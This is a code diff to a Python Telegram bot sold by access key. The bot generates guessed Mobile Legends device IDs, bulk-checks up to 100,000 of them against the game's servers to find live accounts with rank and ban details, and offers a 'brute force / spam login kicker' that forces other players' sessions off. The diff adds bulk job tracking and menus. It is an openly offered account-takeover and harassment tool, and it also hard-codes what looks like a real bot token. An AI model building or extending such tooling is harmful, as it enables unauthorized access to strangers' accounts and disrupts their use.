@@ -37,6 +37,7 @@ OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")
 KEYS_FILE = os.path.join(BASE_DIR, "keys.json")
 USERS_FILE = os.path.join(BASE_DIR, "authorized_users.json")
 BF_LIMITS_FILE = os.path.join(BASE_DIR, "bf_limits.json")
+BULK_JOBS_FILE = os.path.join(BASE_DIR, "bulk_jobs.json")
 
 # === EDIT THESE ===
 BOT_TOKEN = "8692114721:AAFWynpnoKIza6ym4lv3EBomf4WJTmXJCpo"
@@ -51,6 +52,7 @@ CLIENT_VERSION = '2.1.99.1205.1'
 CHANNEL = 'and_usa'
 LANGUAGE = 'en'
 AVG_BYTES_PER_LINE = 80
+MAX_BULK_DEVICES = 100000
 
 HEX_CHARS = "0123456789abcdef"
 
@@ -90,6 +92,7 @@ FILES = {
 KEYS_LOCK = threading.Lock()
 USERS_LOCK = threading.Lock()
 BF_LIMITS_LOCK = threading.Lock()
+BULK_JOBS_LOCK = threading.Lock()
 
 def load_json(filepath):
     if not os.path.exists(filepath):
@@ -372,6 +375,55 @@ def refund_user_bf_device(user_id: int, device_id: str) -> bool:
             save_json(BF_LIMITS_FILE, limits)
             return True
         return False
+
+# ────────────────────────────────────────────────────────────────
+# 2.6 BULK JOB SYSTEM
+# ────────────────────────────────────────────────────────────────
+
+def create_bulk_job(user_id: int, total: int, session_id: str) -> dict:
+    with BULK_JOBS_LOCK:
+        jobs = load_json(BULK_JOBS_FILE)
+        job = {
+            "job_id": session_id,
+            "user_id": user_id,
+            "total": total,
+            "processed": 0,
+            "hits": 0,
+            "failed": 0,
+            "status": "running",
+            "started_at": datetime.now(TZ_WIB).isoformat(),
+            "completed_at": None
+        }
+        jobs[session_id] = job
+        save_json(BULK_JOBS_FILE, jobs)
+        return job
+
+def update_bulk_job(session_id: str, **kwargs):
+    with BULK_JOBS_LOCK:
+        jobs = load_json(BULK_JOBS_FILE)
+        if session_id in jobs:
+            jobs[session_id].update(kwargs)
+            save_json(BULK_JOBS_FILE, jobs)
+
+def get_bulk_job(session_id: str) -> Optional[dict]:
+    with BULK_JOBS_LOCK:
+        jobs = load_json(BULK_JOBS_FILE)
+        return jobs.get(session_id)
+
+def get_user_active_jobs(user_id: int) -> List[dict]:
+    with BULK_JOBS_LOCK:
+        jobs = load_json(BULK_JOBS_FILE)
+        return [j for j in jobs.values() if j.get("user_id") == user_id and j.get("status") == "running"]
+
+def cancel_bulk_job(session_id: str) -> bool:
+    with BULK_JOBS_LOCK:
+        jobs = load_json(BULK_JOBS_FILE)
+        if session_id in jobs and jobs[session_id]["status"] == "running":
+            jobs[session_id]["status"] = "cancelled"
+            jobs[session_id]["completed_at"] = datetime.now(TZ_WIB).isoformat()
+            save_json(BULK_JOBS_FILE, jobs)
+            return True
+    return False
 
 # ────────────────────────────────────────────────────────────────
 # 3. SDP PROTOCOL
@@ -1003,7 +1055,6 @@ def process_detail(device_id: str, account_id: int, zone_id: int) -> Optional[di
             if not conn.get_game_server(): return None
             if not conn.connect_to_game_server(): return None
             
-            # Fetch all data
             skin_info = conn.get_skin_role_info(account_id, zone_id)
             ban_stat = conn.check_ban_status()
             
@@ -1018,11 +1069,8 @@ def process_detail(device_id: str, account_id: int, zone_id: int) -> Optional[di
             result = conn.lookup_player(account_id)
             role_info = conn.get_role_info(account_id, zone_id)
             
-            # --- FIX START: Robust Player Data Extraction ---
             pd = {}
             if result and isinstance(result, dict):
-                # The API often returns data in a nested structure like: {0: [{...player_data...}]}
-                # We need to check multiple possible structures.
                 if isinstance(result.get(0), list) and len(result[0]) > 0:
                     if isinstance(result[0][0], dict):
                         pd = result[0][0]
@@ -1033,41 +1081,28 @@ def process_detail(device_id: str, account_id: int, zone_id: int) -> Optional[di
                 elif isinstance(result.get(0), SdpStruct):
                     pd = dict(result[0])
                 else:
-                    # Fallback to using the result directly
                     pd = result
             
-            # Ensure pd is a dictionary
             if not isinstance(pd, dict):
                 pd = {}
-            # --- FIX END ---
 
             skin_info = skin_info if isinstance(skin_info, dict) else {}
             role_info = role_info if isinstance(role_info, dict) else {}
             
-            # Extract Nickname with multiple fallbacks
             nick = pd.get(2) or skin_info.get(2) or role_info.get(2)
             
-            # If nickname is still missing or invalid, try to find it in other fields
             if not nick or str(nick).lower() in ("unknown", "guest", ""):
-                # Sometimes nickname is in a different tag, try to find any string that looks like a name
                 for key, value in pd.items():
                     if isinstance(value, str) and len(value) > 1 and not value.isdigit():
                         if value.lower() not in ("unknown", "guest", "null", "none"):
                             nick = value
                             break
             
-            # Final fallback if no valid nickname found
             if not nick or str(nick).lower() in ("unknown", "guest", ""):
-                # Instead of returning None (which causes the error), we can create a placeholder
-                # or try to use the account ID. But to avoid saving junk, we'll return None only if
-                # we are sure the account is truly empty.
-                # For now, let's check if we have ANY data. If not, return None.
                 if not pd and not skin_info and not role_info:
                     return None
-                # If we have some data but no nickname, use a generic name
                 nick = f"Player_{account_id}"
 
-            # Extract other stats
             level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
             
             skin_cnt = 0
@@ -1115,8 +1150,6 @@ def process_detail(device_id: str, account_id: int, zone_id: int) -> Optional[di
             return player_data
             
     except Exception as e:
-        # Log the error for debugging if needed
-        # print(f"Error in process_detail: {e}")
         return None
 
 # ────────────────────────────────────────────────────────────────
@@ -1218,7 +1251,7 @@ def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bo
 ) = range(6)
 
 # ────────────────────────────────────────────────────────────────
-# 11. HELPERS
+# 11. HELPERS & KEYBOARDS
 # ────────────────────────────────────────────────────────────────
 
 def is_admin(user_id: int) -> bool:
@@ -1228,15 +1261,17 @@ def escape_html(text: str) -> str:
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 def main_menu_keyboard() -> InlineKeyboardMarkup:
+    """Advanced main menu with better organization"""
     kb = [
-        [InlineKeyboardButton("🔨 Generate Devices", callback_data="gen_menu"),
-         InlineKeyboardButton("🔍 Single Check", callback_data="single_menu")],
-        [InlineKeyboardButton("📂 Bulk Check ", callback_data="bulk_menu"),
-         InlineKeyboardButton("⚡ BruteForce", callback_data="bf_menu")],
-        [InlineKeyboardButton("📊 Statistics", callback_data="stats"),
-         InlineKeyboardButton("👤 My Profile", callback_data="profile")],
-        [InlineKeyboardButton("ℹ️ Help", callback_data="help"),
-         InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin")]
+        [InlineKeyboardButton("🔨 Generate", callback_data="gen_menu"),
+         InlineKeyboardButton("🔍 Single Check", callback_data="single_menu"),
+         InlineKeyboardButton("📂 Bulk Check", callback_data="bulk_menu")],
+        [InlineKeyboardButton("⚡ BruteForce", callback_data="bf_menu"),
+         InlineKeyboardButton("📊 Statistics", callback_data="stats"),
+         InlineKeyboardButton("👤 Profile", callback_data="profile")],
+        [InlineKeyboardButton("📁 My Files", callback_data="files"),
+         InlineKeyboardButton("ℹ️ Help", callback_data="help"),
+         InlineKeyboardButton("🛠️ Admin", callback_data="admin")]
     ]
     return InlineKeyboardMarkup(kb)
 
@@ -1248,7 +1283,7 @@ def admin_panel_keyboard() -> InlineKeyboardMarkup:
          InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey")],
         [InlineKeyboardButton("🚫 Revoke User", callback_data="admin_revoke"),
          InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
-        [InlineKeyboardButton("➕ Add User (Manual)", callback_data="admin_adduser"),
+        [InlineKeyboardButton("➕ Add User", callback_data="admin_adduser"),
          InlineKeyboardButton("📊 Bot Stats", callback_data="admin_botstats")],
         [InlineKeyboardButton("📁 My Files", callback_data="files"),
          InlineKeyboardButton("⚡ BF Limits", callback_data="admin_bf_limits")],
@@ -1272,6 +1307,14 @@ def bf_limits_admin_keyboard() -> InlineKeyboardMarkup:
 def back_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
 
+def confirm_keyboard(action: str, data: str = "") -> InlineKeyboardMarkup:
+    """Confirmation dialog keyboard"""
+    kb = [
+        [InlineKeyboardButton("✅ Yes", callback_data=f"confirm_{action}_{data}"),
+         InlineKeyboardButton("❌ No", callback_data="main_menu")]
+    ]
+    return InlineKeyboardMarkup(kb)
+
 # ────────────────────────────────────────────────────────────────
 # 12. COMMAND HANDLERS
 # ────────────────────────────────────────────────────────────────
@@ -1285,12 +1328,18 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if is_admin(user_id):
         text = (
-            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
             f"═══════════════════════════\n"
             f"👋 Welcome back, <b>Admin</b>!\n"
             f"🆔 ID: <code>{user_id}</code>\n"
             f"👤 Name: {username}\n"
             f"♾️ Access: <b>Lifetime (Admin)</b>\n"
+            f"═══════════════════════════\n"
+            f"🚀 <b>Enhanced Features:</b>\n"
+            f"• Bulk check up to 100,000 devices\n"
+            f"• Real-time job status tracking\n"
+            f"• Advanced button system\n"
+            f"• Session-based file outputs\n"
             f"═══════════════════════════\n"
             f"Choose an option below 👇"
         )
@@ -1298,22 +1347,24 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif valid:
         expiry = get_user_expiry_info(user_id)
         used_count, limit = get_user_bf_usage_stats(user_id)
+        active_jobs = get_user_active_jobs(user_id)
+        jobs_text = f"\n⚙️ Active Jobs: {len(active_jobs)}" if active_jobs else ""
         text = (
-            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
             f"═══════════════════════════\n"
             f"👋 Welcome, <b>{escape_html(username)}</b>!\n"
             f"🆔 ID: <code>{user_id}</code>\n"
             f"═══════════════════════════\n"
             f"📋 <b>Your Access:</b>\n{expiry}\n"
             f"═══════════════════════════\n"
-            f"⚡ <b>BF Usage:</b> {used_count}/{limit}\n"
+            f"⚡ <b>BF Usage:</b> {used_count}/{limit}{jobs_text}\n"
             f"═══════════════════════════\n"
             f"Choose an option below 👇"
         )
         await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
     else:
         text = (
-            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
             f"═══════════════════════════\n"
             f"👋 Hello, <b>{escape_html(username)}</b>!\n"
             f"🆔 ID: <code>{user_id}</code>\n"
@@ -1326,6 +1377,290 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"✨ Created by: @ZyronDevv"
         )
         await update.message.reply_text(text, parse_mode=ParseMode.HTML)
+
+async def cmd_about(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """About the bot"""
+    text = (
+        "ℹ️ <b>ABOUT THIS BOT</b>\n"
+        "═══════════════════════════\n"
+        "🤖 <b>Premium Device ID Bot V2.0</b>\n\n"
+        "This bot provides advanced device ID checking, "
+        "brute force capabilities, and bulk processing for "
+        "Mobile Legends accounts.\n\n"
+        "📊 <b>Features:</b>\n"
+        "• Generate realistic device IDs\n"
+        "• Single & bulk account checking\n"
+        "• 8-request full detail per account\n"
+        "• Rank classification system\n"
+        "• V2L status detection\n"
+        "• Brute force / session kicker\n"
+        "• Bulk job status tracking\n"
+        "• Session-based file outputs\n\n"
+        "👨‍💻 <b>Developer:</b> @ZyronDevv\n"
+        "📅 <b>Version:</b> 2.0\n"
+        "═══════════════════════════\n"
+        "✨ Created by: @ZyronDevv"
+    )
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check bulk job status"""
+    user_id = update.effective_user.id
+    
+    # Check if user specified a job ID
+    if context.args:
+        job_id = context.args[0].strip()
+        job = get_bulk_job(job_id)
+        if not job:
+            await update.message.reply_text(
+                f"❌ Job <code>{job_id}</code> not found!",
+                parse_mode=ParseMode.HTML
+            )
+            return
+        if job.get("user_id") != user_id and not is_admin(user_id):
+            await update.message.reply_text("🔒 You can only check your own jobs!")
+            return
+        
+        await show_job_status(update, context, job)
+        return
+    
+    # Show all active jobs for this user
+    active_jobs = get_user_active_jobs(user_id)
+    
+    if not active_jobs:
+        await update.message.reply_text(
+            "📊 <b>No active bulk jobs</b>\n\n"
+            "Start a bulk check by uploading a .txt file "
+            "using /bulk or the Bulk Check menu option.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_keyboard()
+        )
+        return
+    
+    text = "📊 <b>YOUR ACTIVE JOBS</b>\n═══════════════════════════\n"
+    for job in active_jobs:
+        progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
+        text += (
+            f"🆔 <code>{job['job_id']}</code>\n"
+            f"   📈 {job['processed']:,}/{job['total']:,} ({progress:.1f}%)\n"
+            f"   ✅ Hits: {job['hits']:,} | ❌ Failed: {job['failed']:,}\n"
+            f"   ⏱️ Started: {job['started_at'][:19]}\n\n"
+        )
+    text += "═══════════════════════════"
+    
+    kb = []
+    for job in active_jobs:
+        kb.append([InlineKeyboardButton(
+            f"📊 {job['job_id']} ({job['processed']}/{job['total']})",
+            callback_data=f"jobstatus_{job['job_id']}"
+        )])
+    kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
+    
+    await update.message.reply_text(
+        text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(kb)
+    )
+
+async def show_job_status(update: Update, context: ContextTypes.DEFAULT_TYPE, job: dict):
+    """Show detailed job status"""
+    elapsed = time.time() - datetime.fromisoformat(job['started_at']).timestamp()
+    speed = job['processed'] / elapsed if elapsed > 0 else 0
+    progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
+    eta = (job['total'] - job['processed']) / speed if speed > 0 else 0
+    
+    text = (
+        f"📊 <b>JOB STATUS: {job['job_id']}</b>\n"
+        f"═══════════════════════════\n"
+        f"📈 Progress: {job['processed']:,}/{job['total']:,} ({progress:.1f}%)\n"
+        f"✅ Hits: {job['hits']:,}\n"
+        f"❌ Failed: {job['failed']:,}\n"
+        f"⚡ Speed: {speed:.1f}/s\n"
+        f"⏱️ ETA: {eta/60:.1f} minutes\n"
+        f"📅 Started: {job['started_at'][:19]}\n"
+        f"🔄 Status: {job['status'].upper()}\n"
+        f"═══════════════════════════"
+    )
+    
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🛑 Cancel Job", callback_data=f"canceljob_{job['job_id']}")],
+        [InlineKeyboardButton("🔙 Back", callback_data="status_menu")]
+    ])
+    
+    if hasattr(update, 'callback_query') and update.callback_query:
+        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+    else:
+        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+
+async def cmd_bfstop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stop a running brute force"""
+    user_id = update.effective_user.id
+    device_id = context.user_data.get('bf_device', '')
+    
+    if not device_id:
+        # Check for any active sessions
+        active = []
+        with bf_sessions_lock:
+            for key, session in active_bf_sessions.items():
+                if key.startswith(f"{user_id}_"):
+                    active.append(key)
+        
+        if not active:
+            await update.message.reply_text(
+                "❌ No active brute force sessions found.",
+                reply_markup=main_menu_keyboard()
+            )
+            return
+        
+        # Stop all active sessions for this user
+        for key in active:
+            with bf_sessions_lock:
+                if key in active_bf_sessions:
+                    active_bf_sessions[key]["stop"] = True
+                    active_bf_sessions[key]["refunded"] = True
+            device = key.split('_', 1)[1] if '_' in key else ''
+            if device and not is_admin(user_id):
+                refund_user_bf_device(user_id, device)
+        
+        await update.message.reply_text(
+            f"🛑 <b>Stopped {len(active)} brute force session(s)</b>\n"
+            f"♻️ Usage refunded for all sessions.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=main_menu_keyboard()
+        )
+        return
+    
+    session_key = f"{user_id}_{device_id}"
+    with bf_sessions_lock:
+        if session_key in active_bf_sessions:
+            active_bf_sessions[session_key]["stop"] = True
+            active_bf_sessions[session_key]["refunded"] = True
+    
+    context.user_data["bf_stop_flag"] = True
+    context.user_data["bf_refunded"] = True
+    
+    refunded = False
+    if not is_admin(user_id):
+        if refund_user_bf_device(user_id, device_id):
+            refunded = True
+    
+    msg = "🛑 <b>Stopping brute force...</b>"
+    if refunded:
+        msg += "\n♻️ <b>Usage refunded (+1 remaining)</b>"
+    
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+
+async def cmd_bfstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show current brute force status"""
+    user_id = update.effective_user.id
+    
+    active_sessions = []
+    with bf_sessions_lock:
+        for key, session in active_bf_sessions.items():
+            if key.startswith(f"{user_id}_"):
+                device = key.split('_', 1)[1] if '_' in key else 'unknown'
+                active_sessions.append({
+                    'device': device,
+                    'running': session.get('running', False)
+                })
+    
+    if not active_sessions:
+        await update.message.reply_text(
+            "📊 <b>No active brute force sessions</b>\n\n"
+            "Start one using /bruteforce or the menu button.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=main_menu_keyboard()
+        )
+        return
+    
+    used_count, limit = get_user_bf_usage_stats(user_id)
+    
+    text = (
+        f"⚡ <b>BRUTE FORCE STATUS</b>\n"
+        f"═══════════════════════════\n"
+        f"📊 Your Usage: {used_count}/{limit}\n"
+        f"═══════════════════════════\n"
+        f"<b>Active Sessions:</b>\n"
+    )
+    
+    for session in active_sessions:
+        status = "🟢 Running" if session['running'] else "🔴 Stopped"
+        text += f"📱 <code>{session['device'][:32]}...</code>\n   {status}\n"
+    
+    text += "═══════════════════════════"
+    
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🛑 Stop All", callback_data="bf_stop_all")],
+        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
+    ])
+    
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+
+async def cmd_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Command to check a single device ID"""
+    if context.args:
+        device_id = context.args[0].strip()
+        # Process directly
+        await process_single_device(update, context, device_id)
+    else:
+        context.user_data["waiting_for_single_check"] = True
+        context.user_data["waiting_for_bruteforce"] = False
+        await update.message.reply_text(
+            "🔍 <b>SINGLE ACCOUNT CHECK</b>\n"
+            "═══════════════════════════\n"
+            "Send me a <b>Device ID</b> to check.\n\n"
+            "Usage: <code>/single and_xxxx...</code>\n"
+            "Or just send the device ID directly.\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+
+async def cmd_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Command to start bulk check"""
+    context.user_data["waiting_for_bulk"] = True
+    await update.message.reply_text(
+        f"📂 <b>BULK CHECK (MAX {MAX_BULK_DEVICES:,})</b>\n"
+        "═══════════════════════════\n"
+        "📤 <b>Upload a .txt file</b> containing device IDs (one per line).\n\n"
+        "🔍 The bot will:\n"
+        "• Check each device with 8 requests\n"
+        "• Sort accounts by rank\n"
+        "• Detect V2L status\n"
+        "• Filter banned accounts\n"
+        "• Auto-upload result files when complete\n"
+        f"• Max {MAX_BULK_DEVICES:,} devices per file\n\n"
+        "💡 Use /status to check job progress\n"
+        "Type /cancel to abort.",
+        parse_mode=ParseMode.HTML
+    )
+
+async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Command to start brute force"""
+    if context.args:
+        device_id = context.args[0].strip()
+        context.user_data["waiting_for_bruteforce"] = True
+        # Simulate device input
+        await process_bf_device(update, context, device_id)
+    else:
+        context.user_data["waiting_for_bruteforce"] = True
+        context.user_data["waiting_for_single_check"] = False
+        
+        user_id = update.effective_user.id
+        used_count, limit = get_user_bf_usage_stats(user_id)
+        remaining = limit - used_count if limit > 0 else "Unlimited"
+        
+        await update.message.reply_text(
+            f"⚡ <b>BRUTE FORCE / SPAM LOGIN KICKER</b>\n"
+            f"═══════════════════════════\n"
+            f"🔢 Used: {used_count}/{limit} devices\n"
+            f"📊 Remaining: {remaining}\n"
+            f"═══════════════════════════\n"
+            f"Send me a <b>Device ID</b> to target.\n\n"
+            f"Usage: <code>/bruteforce and_xxxx...</code>\n"
+            f"Or just send the device ID directly.\n\n"
+            f"Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
 
 async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -1366,16 +1701,25 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "ℹ️ <b>HELP & COMMANDS</b>\n"
         "═══════════════════════════\n\n"
-        "<b>Commands:</b>\n"
-        "• /start - Show main menu\n"
-        "• /redeem KEY - Activate access key\n"
-        "• /cancel - Cancel current operation\n"
-        "• /help - Show this help\n"
-        "• /mykey - View your access info\n\n"
+        "<b>Available Commands:</b>\n"
+        "• /start - Show this message\n"
+        "• /help - Show help\n"
+        "• /about - About this bot\n"
+        "• /single - Check a single device ID\n"
+        "• /bulk - Upload file for bulk check\n"
+        "• /status - Check bulk job status\n"
+        "• /cancel - Cancel a running bulk job\n"
+        "• /redeem - Redeem subscription key\n"
+        "• /mykey - Check subscription status\n"
+        "• /bruteforce - Brute force / spam login kicker\n"
+        "• /bfstop - Stop a running brute force\n"
+        "• /bfstatus - Show current brute force status\n\n"
+        "<b>Device ID Format:</b>\n"
+        "<code>and_a1b2c3d4e5f6...</code>\n\n"
         "<b>Features:</b>\n"
         "🔨 Generate Devices - Create random device IDs\n"
-        "🔍 Single Check - Check one device \n"
-        "📂 Bulk Check - Upload .txt file to check many\n"
+        "🔍 Single Check - Check one device\n"
+        "📂 Bulk Check - Upload .txt file (max 100K)\n"
         "⚡ Brute Force - Spam login kicker\n"
         "📊 Statistics - View hit counters\n"
         "📁 My Files - Download result files\n"
@@ -1393,7 +1737,9 @@ async def cmd_mykey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     expiry = get_user_expiry_info(user_id)
     used_count, limit = get_user_bf_usage_stats(user_id)
-    await update.message.reply_text(
+    active_jobs = get_user_active_jobs(user_id)
+    
+    text = (
         f"👤 <b>YOUR ACCESS INFO</b>\n"
         f"═══════════════════════════\n"
         f"🆔 User ID: <code>{user_id}</code>\n"
@@ -1403,13 +1749,22 @@ async def cmd_mykey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"  📊 Used: {used_count}/{limit}\n"
         f"  💡 Each device can only be used once\n"
         f"  ♻️ Usage is refunded if you cancel/stop\n"
-        f"═══════════════════════════",
-        parse_mode=ParseMode.HTML
     )
+    
+    if active_jobs:
+        text += f"═══════════════════════════\n📊 <b>Active Bulk Jobs:</b> {len(active_jobs)}\n"
+        for job in active_jobs:
+            progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
+            text += f"  🆔 {job['job_id']}: {progress:.1f}%\n"
+    
+    text += "═══════════════════════════"
+    
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
 
 async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["waiting_for_single_check"] = False
     context.user_data["waiting_for_bruteforce"] = False
+    context.user_data["waiting_for_bulk"] = False
     context.user_data["bf_stop_flag"] = True
     context.user_data.pop("admin_bf_action", None)
     context.user_data.pop("bf_target_user_id", None)
@@ -1419,7 +1774,6 @@ async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     device_id = context.user_data.get("bf_device", "")
     
-    # ─── REFUND BF USAGE IF CANCELLED ───
     refunded = False
     if device_id and not is_admin(user_id):
         if refund_user_bf_device(user_id, device_id):
@@ -1431,7 +1785,6 @@ async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             active_bf_sessions[session_key]["stop"] = True
             active_bf_sessions[session_key]["refunded"] = True
     
-    # Mark context so run_spam_kick knows not to commit on finish
     context.user_data["bf_refunded"] = True
     
     msg = "❌ Operation cancelled."
@@ -1451,6 +1804,80 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
     user_id = update.effective_user.id
     
+    # Handle job status callbacks (no auth needed for own jobs)
+    if data.startswith("jobstatus_"):
+        job_id = data.replace("jobstatus_", "")
+        job = get_bulk_job(job_id)
+        if job and (job.get("user_id") == user_id or is_admin(user_id)):
+            await show_job_status(update, context, job)
+        return
+    
+    if data.startswith("canceljob_"):
+        job_id = data.replace("canceljob_", "")
+        job = get_bulk_job(job_id)
+        if job and (job.get("user_id") == user_id or is_admin(user_id)):
+            if cancel_bulk_job(job_id):
+                await query.edit_message_text(
+                    f"🛑 <b>Job {job_id} cancelled</b>",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=main_menu_keyboard()
+                )
+            else:
+                await query.answer("❌ Job not found or already completed!", show_alert=True)
+        return
+    
+    if data == "bf_stop_all":
+        active = []
+        with bf_sessions_lock:
+            for key, session in active_bf_sessions.items():
+                if key.startswith(f"{user_id}_"):
+                    active.append(key)
+        
+        for key in active:
+            with bf_sessions_lock:
+                if key in active_bf_sessions:
+                    active_bf_sessions[key]["stop"] = True
+                    active_bf_sessions[key]["refunded"] = True
+            device = key.split('_', 1)[1] if '_' in key else ''
+            if device and not is_admin(user_id):
+                refund_user_bf_device(user_id, device)
+        
+        await query.edit_message_text(
+            f"🛑 <b>Stopped {len(active)} session(s)</b>\n♻️ Usage refunded.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=main_menu_keyboard()
+        )
+        return
+    
+    if data == "status_menu":
+        # Show status menu
+        active_jobs = get_user_active_jobs(user_id)
+        if not active_jobs:
+            await query.edit_message_text(
+                "📊 <b>No active jobs</b>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=main_menu_keyboard()
+            )
+            return
+        
+        text = "📊 <b>YOUR ACTIVE JOBS</b>\n═══════════════════════════\n"
+        kb = []
+        for job in active_jobs:
+            progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
+            text += f"🆔 <code>{job['job_id']}</code>: {progress:.1f}%\n"
+            kb.append([InlineKeyboardButton(
+                f"📊 {job['job_id']}",
+                callback_data=f"jobstatus_{job['job_id']}"
+            )])
+        kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
+        
+        await query.edit_message_text(
+            text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(kb)
+        )
+        return
+    
     valid, _ = is_user_authorized(user_id)
     if not valid and not is_admin(user_id):
         await query.answer("🔒 Access required! Use /redeem KEY", show_alert=True)
@@ -1468,6 +1895,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "bulk_menu":
         context.user_data["waiting_for_single_check"] = False
         context.user_data["waiting_for_bruteforce"] = False
+        context.user_data["waiting_for_bulk"] = True
         context.user_data.pop("admin_bf_action", None)
         await show_bulk_menu(query, context)
     elif data == "bf_menu":
@@ -1487,6 +1915,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if is_admin(user_id):
             context.user_data["waiting_for_single_check"] = False
             context.user_data["waiting_for_bruteforce"] = False
+            context.user_data["waiting_for_bulk"] = False
             context.user_data.pop("admin_bf_action", None)
             await show_admin_panel(query, context)
         else:
@@ -1513,13 +1942,14 @@ async def show_main_menu(query, context):
     
     context.user_data["waiting_for_single_check"] = False
     context.user_data["waiting_for_bruteforce"] = False
+    context.user_data["waiting_for_bulk"] = False
     context.user_data.pop("admin_bf_action", None)
     context.user_data.pop("admin_conv_state", None)
     context.user_data.pop("bf_custom_stage", None)
     
     if is_admin(user_id):
         text = (
-            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
             f"═══════════════════════════\n"
             f"👋 <b>Admin Panel</b>\n"
             f"Choose an option below 👇"
@@ -1527,12 +1957,14 @@ async def show_main_menu(query, context):
     else:
         expiry = get_user_expiry_info(user_id)
         used_count, limit = get_user_bf_usage_stats(user_id)
+        active_jobs = get_user_active_jobs(user_id)
+        jobs_text = f"\n⚙️ Active Jobs: {len(active_jobs)}" if active_jobs else ""
         text = (
-            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
             f"═══════════════════════════\n"
             f"👋 Welcome, <b>{escape_html(username)}</b>!\n"
             f"{expiry}\n"
-            f"⚡ BF: {used_count}/{limit}\n"
+            f"⚡ BF: {used_count}/{limit}{jobs_text}\n"
             f"═══════════════════════════\n"
             f"Choose an option below 👇"
         )
@@ -1542,7 +1974,8 @@ async def show_gen_menu(query, context):
     kb = InlineKeyboardMarkup([
         [InlineKeyboardButton("📦 5 MB", callback_data="gen_start_5"),
          InlineKeyboardButton("📦 10 MB", callback_data="gen_start_10")],
-        [InlineKeyboardButton("📦 25 MB", callback_data="gen_start_25")],
+        [InlineKeyboardButton("📦 25 MB", callback_data="gen_start_25"),
+         InlineKeyboardButton("📦 50 MB", callback_data="gen_start_50")],
         [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
     ])
     text = (
@@ -1550,13 +1983,14 @@ async def show_gen_menu(query, context):
         "═══════════════════════════\n"
         "Select the size of device IDs to generate:\n\n"
         "💡 <b>1 MB ≈ 13,000 devices</b>\n"
-        "💡 <b>10 MB ≈ 130,000 devices</b>"
+        "💡 <b>10 MB ≈ 130,000 devices</b>\n"
+        "💡 <b>50 MB ≈ 650,000 devices</b>"
     )
